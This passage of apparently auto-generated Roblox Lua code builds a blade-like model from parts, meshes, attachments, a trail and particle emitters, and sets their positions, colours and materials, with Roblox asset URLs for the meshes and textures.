red_16.CFrame = CFrame.fromMatrix(Vector3.new(-2.4058728218078613, 26.39924430847168, 13.742884635925293), Vector3.new(0.9659256339073181, 0.0000015199182143987855, -0.25881901383399963), Vector3.new(-0.258819043636322, -0.000006957913683436345, -0.9659258127212524), Vector3.new(-0.000003277565838288865, 0.9999998807907104, -0.000006322572971839691))
red_16.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_16.FrontSurface = Enum.SurfaceType.Weld
red_16.LeftSurface = Enum.SurfaceType.Weld
red_16.Material = Enum.Material.Fabric
red_16.Orientation = Vector3.new(-90, 15, 0)
red_16.RightSurface = Enum.SurfaceType.Weld
red_16.Rotation = Vector3.new(-90, 0, 15)
red_16.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_16.TopSurface = Enum.SurfaceType.Weld
red_16.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_16.Name = "RED"
red_16.Parent = ycsi

local mesh_4 = Instance.new("SpecialMesh")
mesh_4.MeshType = Enum.MeshType.FileMesh
mesh_4.MeshId = "http://www.roblox.com/asset/?id=36869983"
mesh_4.Scale = Vector3.new(0.10000000149011612, 0.15000000596046448, 0.05000000074505806)
mesh_4.Parent = red_16

local red_17 = Instance.new("Part")
red_17.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_17.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_17.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_17.CFrame = CFrame.fromMatrix(Vector3.new(-1.7852673530578613, 26.52928352355957, 16.70646095275879), Vector3.new(0.000011920608812943101, -0.9999998807907104, -0.000010013320206780918), Vector3.new(-0.9939444065093994, -0.000010801184544106945, -0.10988418757915497), Vector3.new(0.10988396406173706, 0.000011204485417692922, -0.9939445853233337))
red_17.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_17.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_17.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_17.Material = Enum.Material.SmoothPlastic
red_17.Orientation = Vector3.new(-0.0010000000474974513, 173.6909942626953, -90.0009994506836)
red_17.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_17.Rotation = Vector3.new(-179.99899291992188, 6.309000015258789, 89.9990005493164)
red_17.Size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_17.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_17.size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_17.Name = "RED"
red_17.Parent = ycsi

local mesh_5 = Instance.new("SpecialMesh")
mesh_5.MeshType = Enum.MeshType.FileMesh
mesh_5.MeshId = "http://www.roblox.com/asset/?id=9756362"
mesh_5.Scale = Vector3.new(0.14000000059604645, 0.3100000023841858, 0.15000000596046448)
mesh_5.Parent = red_17

local handle = Instance.new("Part")
handle.BackSurface = Enum.SurfaceType.SmoothNoOutlines
handle.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
handle.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
handle.CFrame = CFrame.fromMatrix(Vector3.new(-2.236912250518799, 26.529245376586914, 14.432642936706543), Vector3.new(-0.000003277565838288865, 0.9999998807907104, -0.000006322572971839691), Vector3.new(0.258819043636322, 0.000006957913683436345, 0.9659258127212524), Vector3.new(0.9659256339073181, 0.0000015199182143987855, -0.25881901383399963))
handle.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
handle.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
handle.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
handle.Orientation = Vector3.new(0, 105, 90)
handle.RightSurface = Enum.SurfaceType.SmoothNoOutlines
handle.Rotation = Vector3.new(180, 75, -90.0009994506836)
handle.Size = Vector3.new(0.30000007152557373, 1.140000343322754, 0.3400000333786011)
handle.TopSurface = Enum.SurfaceType.SmoothNoOutlines
handle.size = Vector3.new(0.30000007152557373, 1.140000343322754, 0.3400000333786011)
handle.Name = "Handle"
handle.Parent = ycsi

local redb = Instance.new("Part")
redb.BackSurface = Enum.SurfaceType.SmoothNoOutlines
redb.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
redb.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
redb.CFrame = CFrame.fromMatrix(Vector3.new(-1.2064480781555176, 26.5293025970459, 18.230669021606445), Vector3.new(0.258819043636322, 0.000006996440788498148, 0.9659258127212524), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(0.0000032299637950927718, -0.9999998807907104, 0.000006375214525178308))
redb.Color = Color3.new(0.972549, 0.972549, 0.972549)
redb.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
redb.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
redb.Material = Enum.Material.SmoothPlastic
redb.Orientation = Vector3.new(90, -75, 0)
redb.RightSurface = Enum.SurfaceType.SmoothNoOutlines
redb.Rotation = Vector3.new(90, 0, 75)
redb.Size = Vector3.new(4.510000228881836, 0.64000004529953, 0.2600005567073822)
redb.TopSurface = Enum.SurfaceType.SmoothNoOutlines
redb.size = Vector3.new(4.510000228881836, 0.64000004529953, 0.2600005567073822)
redb.Name = "REDB"
redb.Parent = ycsi

local attachment0 = Instance.new("Attachment")
attachment0.CFrame = CFrame.fromMatrix(Vector3.new(2.000000238418579, 0, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
attachment0.Position = Vector3.new(2.000000238418579, 0, 0)
attachment0.Visible = false
attachment0.WorldAxis = Vector3.new(0.258819043636322, 0.000006996440788498148, 0.9659258127212524)
attachment0.WorldCFrame = CFrame.fromMatrix(Vector3.new(-0.6888099312782288, 26.529315948486328, 20.162521362304688), Vector3.new(0.258819043636322, 0.000006996440788498148, 0.9659258127212524), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(0.0000032299637950927718, -0.9999998807907104, 0.000006375214525178308))
attachment0.WorldOrientation = Vector3.new(90, -75, 0)
attachment0.WorldPosition = Vector3.new(-0.6888099312782288, 26.529315948486328, 20.162521362304688)
attachment0.WorldSecondaryAxis = Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963)
attachment0.Name = "Attachment0"
attachment0.Parent = redb

local attachment1 = Instance.new("Attachment")
attachment1.CFrame = CFrame.fromMatrix(Vector3.new(-2.000000238418579, 0, 0), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
attachment1.Position = Vector3.new(-2.000000238418579, 0, 0)
attachment1.Visible = false
attachment1.WorldAxis = Vector3.new(0.258819043636322, 0.000006996440788498148, 0.9659258127212524)
attachment1.WorldCFrame = CFrame.fromMatrix(Vector3.new(-1.7240862846374512, 26.52928924560547, 16.298816680908203), Vector3.new(0.258819043636322, 0.000006996440788498148, 0.9659258127212524), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(0.0000032299637950927718, -0.9999998807907104, 0.000006375214525178308))
attachment1.WorldOrientation = Vector3.new(90, -75, 0)
attachment1.WorldPosition = Vector3.new(-1.7240862846374512, 26.52928924560547, 16.298816680908203)
attachment1.WorldSecondaryAxis = Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963)
attachment1.Name = "Attachment1"
attachment1.Parent = redb

local trail = Instance.new("Trail")
trail.Attachment0 = attachment0
trail.Attachment1 = attachment1
trail.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(0, 0, 0)), ColorSequenceKeypoint.new(1, Color3.new(0, 0, 0))})
trail.Lifetime = 0.10000000149011612
trail.LightInfluence = 1
trail.Parent = redb

local red_18 = Instance.new("Part")
red_18.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_18.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_18.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_18.CFrame = CFrame.fromMatrix(Vector3.new(-1.2727932929992676, 26.529233932495117, 17.03502082824707), Vector3.new(0.000013636660696647596, -0.9999998807907104, -0.00001316615907853702), Vector3.new(-0.9659249782562256, -0.000016510475688846782, 0.258820503950119), Vector3.new(-0.25882068276405334, 0.000009137793313129805, -0.9659251570701599))
red_18.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_18.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_18.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_18.Material = Enum.Material.Metal
red_18.Orientation = Vector3.new(-0.0010000000474974513, -165, -90.0009994506836)
red_18.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_18.Rotation = Vector3.new(-179.99899291992188, -15, 89.9990005493164)
red_18.Size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_18.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_18.size = Vector3.new(0.20000000298023224, 0.30000001192092896, 0.20000000298023224)
red_18.Name = "RED"
red_18.Parent = ycsi

local mesh_6 = Instance.new("SpecialMesh")
mesh_6.MeshType = Enum.MeshType.FileMesh
mesh_6.MeshId = "http://www.roblox.com/asset/?id=9756362"
mesh_6.Scale = Vector3.new(0.14000000059604645, 0.25, 0.4000000059604645)
mesh_6.Parent = red_18

local bladeouterwedge3 = Instance.new("Part")
bladeouterwedge3.BackSurface = Enum.SurfaceType.SmoothNoOutlines
bladeouterwedge3.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
bladeouterwedge3.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
bladeouterwedge3.CFrame = CFrame.fromMatrix(Vector3.new(-1.8220181465148926, 26.52907371520996, 15.989452362060547), Vector3.new(-0.9659256339073181, -0.0000013113024124322692, 0.25881895422935486), Vector3.new(-0.25881895422935486, -0.000007274018116731895, -0.9659256935119629), Vector3.new(0.000003157872470183065, -1, 0.0000066819025050790515))
bladeouterwedge3.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
bladeouterwedge3.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
bladeouterwedge3.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
bladeouterwedge3.Material = Enum.Material.Metal
bladeouterwedge3.Orientation = Vector3.new(90, -165, 0)
bladeouterwedge3.RightSurface = Enum.SurfaceType.SmoothNoOutlines
bladeouterwedge3.Rotation = Vector3.new(90, 0, 165)
bladeouterwedge3.Size = Vector3.new(0.27000001072883606, 0.20000000298023224, 0.20000000298023224)
bladeouterwedge3.TopSurface = Enum.SurfaceType.SmoothNoOutlines
bladeouterwedge3.size = Vector3.new(0.27000001072883606, 0.20000000298023224, 0.20000000298023224)
bladeouterwedge3.Name = "blade outer wedge3"
bladeouterwedge3.Parent = ycsi

local mesh_7 = Instance.new("SpecialMesh")
mesh_7.MeshType = Enum.MeshType.Torso
mesh_7.Scale = Vector3.new(1.7000000476837158, 1, 0.949999988079071)
mesh_7.Parent = bladeouterwedge3

local red_19 = Instance.new("Part")
red_19.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_19.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_19.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_19.CFrame = CFrame.fromMatrix(Vector3.new(-1.7521634101867676, 26.52925682067871, 16.250246047973633), Vector3.new(0.9659256339073181, 0.0000022053720840631286, -0.25881895422935486), Vector3.new(0.25881895422935486, 0.000007500530500692548, 0.9659257531166077), Vector3.new(0.000004080103281012271, -1, 0.0000066692937252810225))
red_19.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_19.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_19.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_19.Material = Enum.Material.Metal
red_19.Orientation = Vector3.new(90, 15, 0)
red_19.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_19.Rotation = Vector3.new(90, 0, -15)
red_19.Size = Vector3.new(0.27000001072883606, 0.20000000298023224, 0.20000000298023224)
red_19.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_19.size = Vector3.new(0.27000001072883606, 0.20000000298023224, 0.20000000298023224)
red_19.Name = "RED"
red_19.Parent = ycsi

local mesh_8 = Instance.new("SpecialMesh")
mesh_8.MeshType = Enum.MeshType.Torso
mesh_8.Scale = Vector3.new(0.6000000238418579, 1, 1.2000000476837158)
mesh_8.Parent = red_19

local bladespecialwedge = Instance.new("Part")
bladespecialwedge.BackSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
bladespecialwedge.CFrame = CFrame.fromMatrix(Vector3.new(-1.7909512519836426, 26.529226303100586, 16.105396270751953), Vector3.new(0.9659256339073181, 0.0000022053720840631286, -0.25881895422935486), Vector3.new(0.25881895422935486, 0.000007500530500692548, 0.9659257531166077), Vector3.new(0.000004080103281012271, -1, 0.0000066692937252810225))
bladespecialwedge.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
bladespecialwedge.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge.Material = Enum.Material.Metal
bladespecialwedge.Orientation = Vector3.new(90, 15, 0)
bladespecialwedge.RightSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge.Rotation = Vector3.new(90, 0, -15)
bladespecialwedge.Size = Vector3.new(0.27000001072883606, 0.20000000298023224, 0.20000000298023224)
bladespecialwedge.TopSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge.size = Vector3.new(0.27000001072883606, 0.20000000298023224, 0.20000000298023224)
bladespecialwedge.Name = "blade special wedge"
bladespecialwedge.Parent = ycsi

local mesh_9 = Instance.new("SpecialMesh")
mesh_9.MeshType = Enum.MeshType.Torso
mesh_9.Scale = Vector3.new(1, 1, 1.2000000476837158)
mesh_9.Parent = bladespecialwedge

local bladespecialwedge_2 = Instance.new("Part")
bladespecialwedge_2.BackSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_2.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_2.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
bladespecialwedge_2.CFrame = CFrame.fromMatrix(Vector3.new(-1.90226411819458, 26.52912712097168, 15.690067291259766), Vector3.new(0.9659256339073181, 0.0000022053720840631286, -0.25881895422935486), Vector3.new(0.25881895422935486, 0.000007500530500692548, 0.9659257531166077), Vector3.new(0.000004080103281012271, -1, 0.0000066692937252810225))
bladespecialwedge_2.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
bladespecialwedge_2.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_2.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_2.Material = Enum.Material.Metal
bladespecialwedge_2.Orientation = Vector3.new(90, 15, 0)
bladespecialwedge_2.RightSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_2.Rotation = Vector3.new(90, 0, -15)
bladespecialwedge_2.Size = Vector3.new(0.27000001072883606, 0.20000000298023224, 0.20000000298023224)
bladespecialwedge_2.TopSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_2.size = Vector3.new(0.27000001072883606, 0.20000000298023224, 0.20000000298023224)
bladespecialwedge_2.Name = "blade special wedge"
bladespecialwedge_2.Parent = ycsi

local mesh_10 = Instance.new("SpecialMesh")
mesh_10.MeshType = Enum.MeshType.Torso
mesh_10.Scale = Vector3.new(2.0999999046325684, 1.2999999523162842, 1.2000000476837158)
mesh_10.Parent = bladespecialwedge_2

local bladespecialwedge_3 = Instance.new("Part")
bladespecialwedge_3.BackSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_3.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_3.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
bladespecialwedge_3.CFrame = CFrame.fromMatrix(Vector3.new(-1.8427166938781738, 26.529172897338867, 15.912212371826172), Vector3.new(0.9659256339073181, 0.0000022053720840631286, -0.25881895422935486), Vector3.new(0.25881895422935486, 0.000007500530500692548, 0.9659257531166077), Vector3.new(0.000004080103281012271, -1, 0.0000066692937252810225))
bladespecialwedge_3.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
bladespecialwedge_3.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_3.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_3.Material = Enum.Material.Metal
bladespecialwedge_3.Orientation = Vector3.new(90, 15, 0)
bladespecialwedge_3.RightSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_3.Rotation = Vector3.new(90, 0, -15)
bladespecialwedge_3.Size = Vector3.new(0.27000001072883606, 0.20000000298023224, 0.20000000298023224)
bladespecialwedge_3.TopSurface = Enum.SurfaceType.SmoothNoOutlines
bladespecialwedge_3.size = Vector3.new(0.27000001072883606, 0.20000000298023224, 0.20000000298023224)
bladespecialwedge_3.Name = "blade special wedge"
bladespecialwedge_3.Parent = ycsi

local mesh_11 = Instance.new("SpecialMesh")
mesh_11.MeshType = Enum.MeshType.Torso
mesh_11.Scale = Vector3.new(1.5499999523162842, 1, 1.2000000476837158)
mesh_11.Parent = bladespecialwedge_3

local red_20 = Instance.new("Part")
red_20.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_20.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_20.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_20.CFrame = CFrame.fromMatrix(Vector3.new(-0.7899899482727051, 26.52928352355957, 19.842782974243164), Vector3.new(0.258819043636322, 0.000006996440788498148, 0.9659258127212524), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(0.0000032299637950927718, -0.9999998807907104, 0.000006375214525178308))
red_20.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_20.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_20.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_20.Material = Enum.Material.SmoothPlastic
red_20.Orientation = Vector3.new(90, -75, 0)
red_20.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_20.Rotation = Vector3.new(90, 0, 75)
red_20.Size = Vector3.new(1.0800001621246338, 0.20000000298023224, 0.20000000298023224)
red_20.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_20.size = Vector3.new(1.0800001621246338, 0.20000000298023224, 0.20000000298023224)
red_20.Name = "RED"
red_20.Parent = ycsi

local p = Instance.new("ParticleEmitter")
p.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(0.392157, 0, 0)), ColorSequenceKeypoint.new(1, Color3.new(0.392157, 0, 0))})
p.EmissionDirection = Enum.NormalId.Right
p.Lifetime = NumberRange.new(0.4000000059604645, 2.700000047683716)
p.LightEmission = 3
p.LockedToPart = true
p.Rate = 100
p.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.20000000298023224), NumberSequenceKeypoint.new(1, 0.20000000298023224)})
p.Speed = NumberRange.new(0.10000000149011612, 0.30000001192092896)
p.SpreadAngle = Vector2.new(60, 60)
p.Texture = "http://www.roblox.com/asset/?id=248376121"
p.ZOffset = 0.004999999888241291
p.Name = "P"
p.Parent = red_20

local red_21 = Instance.new("Part")
red_21.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_21.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_21.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_21.CFrame = CFrame.fromMatrix(Vector3.new(-0.9970440864562988, 26.52927589416504, 19.0700626373291), Vector3.new(0.258819043636322, 0.000006996440788498148, 0.9659258127212524), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(0.0000032299637950927718, -0.9999998807907104, 0.000006375214525178308))
red_21.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_21.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_21.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_21.Material = Enum.Material.SmoothPlastic
red_21.Orientation = Vector3.new(90, -75, 0)
red_21.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_21.Rotation = Vector3.new(90, 0, 75)
red_21.Size = Vector3.new(1.0800001621246338, 0.20000000298023224, 0.20000000298023224)
red_21.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_21.size = Vector3.new(1.0800001621246338, 0.20000000298023224, 0.20000000298023224)
red_21.Name = "RED"
red_21.Parent = ycsi

local p_2 = Instance.new("ParticleEmitter")
p_2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(0.392157, 0, 0)), ColorSequenceKeypoint.new(1, Color3.new(0.392157, 0, 0))})
p_2.EmissionDirection = Enum.NormalId.Right
p_2.Lifetime = NumberRange.new(0.4000000059604645, 2.700000047683716)
p_2.LightEmission = 3
p_2.LockedToPart = true
p_2.Rate = 100
p_2.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.30000001192092896), NumberSequenceKeypoint.new(1, 0.30000001192092896)})
p_2.Speed = NumberRange.new(0.10000000149011612, 0.30000001192092896)
p_2.SpreadAngle = Vector2.new(60, 60)
p_2.Texture = "http://www.roblox.com/asset/?id=248376121"
p_2.ZOffset = 0.019999999552965164
p_2.Name = "P"
p_2.Parent = red_21

local red_22 = Instance.new("Part")
red_22.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_22.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_22.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_22.CFrame = CFrame.fromMatrix(Vector3.new(-1.6376538276672363, 26.52928352355957, 16.679407119750977), Vector3.new(0.258819043636322, 0.000006996440788498148, 0.9659258127212524), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(0.0000032299637950927718, -0.9999998807907104, 0.000006375214525178308))
red_22.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_22.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_22.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_22.Material = Enum.Material.SmoothPlastic
red_22.Orientation = Vector3.new(90, -75, 0)
red_22.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_22.Rotation = Vector3.new(90, 0, 75)
red_22.Size = Vector3.new(1.7700002193450928, 0.20000000298023224, 0.20000000298023224)
red_22.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_22.size = Vector3.new(1.7700002193450928, 0.20000000298023224, 0.20000000298023224)
red_22.Name = "RED"
red_22.Parent = ycsi

local p_3 = Instance.new("ParticleEmitter")
p_3.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(0.392157, 0, 0)), ColorSequenceKeypoint.new(1, Color3.new(0.392157, 0, 0))})
p_3.EmissionDirection = Enum.NormalId.Right
p_3.Lifetime = NumberRange.new(0.4000000059604645, 2.700000047683716)
p_3.LightEmission = 3
p_3.LockedToPart = true
p_3.Rate = 120
p_3.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.5), NumberSequenceKeypoint.new(1, 0.5)})
p_3.Speed = NumberRange.new(0.10000000149011612, 0.30000001192092896)
p_3.SpreadAngle = Vector2.new(250, 250)
p_3.Texture = "http://www.roblox.com/asset/?id=248376121"
p_3.ZOffset = 0.07999999821186066
p_3.Name = "P"
p_3.Parent = red_22

local red_23 = Instance.new("Part")
red_23.BackSurface = Enum.SurfaceType.SmoothNoOutlines
red_23.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
red_23.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_23.CFrame = CFrame.fromMatrix(Vector3.new(-1.241650104522705, 26.539281845092773, 18.157297134399414), Vector3.new(0.258819043636322, 0.000006996440788498148, 0.9659258127212524), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(0.0000032299637950927718, -0.9999998807907104, 0.000006375214525178308))
red_23.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_23.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
red_23.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
red_23.Material = Enum.Material.SmoothPlastic
red_23.Orientation = Vector3.new(90, -75, 0)
red_23.RightSurface = Enum.SurfaceType.SmoothNoOutlines
red_23.Rotation = Vector3.new(90, 0, 75)
red_23.Size = Vector3.new(1.5300002098083496, 0.20000000298023224, 0.20000000298023224)
red_23.TopSurface = Enum.SurfaceType.SmoothNoOutlines
red_23.size = Vector3.new(1.5300002098083496, 0.20000000298023224, 0.20000000298023224)
red_23.Name = "RED"
red_23.Parent = ycsi

local p_4 = Instance.new("ParticleEmitter")
p_4.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(0.392157, 0, 0)), ColorSequenceKeypoint.new(1, Color3.new(0.392157, 0, 0))})
p_4.EmissionDirection = Enum.NormalId.Right
p_4.Lifetime = NumberRange.new(0.4000000059604645, 2.700000047683716)
p_4.LightEmission = 3
p_4.LockedToPart = true
p_4.Rate = 110
p_4.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.44999998807907104), NumberSequenceKeypoint.new(1, 0.44999998807907104)})
p_4.Speed = NumberRange.new(0.10000000149011612, 0.30000001192092896)
p_4.SpreadAngle = Vector2.new(120, 120)
p_4.Texture = "http://www.roblox.com/asset/?id=248376121"
p_4.ZOffset = 0.05000000074505806
p_4.Name = "P"
p_4.Parent = red_23

local glow = Instance.new("Part")
glow.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow.CFrame = CFrame.fromMatrix(Vector3.new(-1.8497357368469238, 26.78415870666504, 15.483081817626953), Vector3.new(0.6846506595611572, -0.15030045807361603, 0.7132059931755066), Vector3.new(0.72423255443573, 0.030068621039390564, -0.6888995170593262), Vector3.new(0.08209670335054398, 0.9881829023361206, 0.12943902611732483))
glow.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow.Material = Enum.Material.Neon
glow.Orientation = Vector3.new(-81.18299865722656, 32.3849983215332, -78.68699645996094)
glow.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow.Rotation = Vector3.new(-82.53700256347656, 4.709000110626221, -46.60900115966797)
glow.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow.Name = "glow"
glow.Parent = ycsi

local mesh_12 = Instance.new("SpecialMesh")
mesh_12.MeshType = Enum.MeshType.Sphere
mesh_12.Scale = Vector3.new(0.5, 1.2000000476837158, 0.5)
mesh_12.Parent = glow

local glow_2 = Instance.new("Part")
glow_2.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow_2.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow_2.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow_2.CFrame = CFrame.fromMatrix(Vector3.new(-2.04551362991333, 26.784120559692383, 15.525203704833984), Vector3.new(-0.28190308809280396, -0.3218234181404114, 0.9038584232330322), Vector3.new(0.9533233642578125, 0.012272919528186321, 0.30170077085494995), Vector3.new(-0.10818730294704437, 0.9467201232910156, 0.30334219336509705))
glow_2.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow_2.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow_2.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow_2.Material = Enum.Material.Neon
glow_2.Orientation = Vector3.new(-71.21299743652344, -19.628999710083008, -87.81600189208984)
glow_2.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow_2.Rotation = Vector3.new(-72.23400115966797, -6.210999965667725, -106.4729995727539)
glow_2.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow_2.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow_2.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow_2.Name = "glow"
glow_2.Parent = ycsi

local mesh_13 = Instance.new("SpecialMesh")
mesh_13.MeshType = Enum.MeshType.Sphere
mesh_13.Scale = Vector3.new(0.5, 1.2000000476837158, 0.5)
mesh_13.Parent = glow_2

local glow2 = Instance.new("Part")
glow2.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow2.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow2.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow2.CFrame = CFrame.fromMatrix(Vector3.new(-1.8400769233703613, 26.74412727355957, 15.48049545288086), Vector3.new(0.6846506595611572, -0.15030045807361603, 0.7132059931755066), Vector3.new(0.72423255443573, 0.030068621039390564, -0.6888995170593262), Vector3.new(0.08209670335054398, 0.9881829023361206, 0.12943902611732483))
glow2.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow2.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
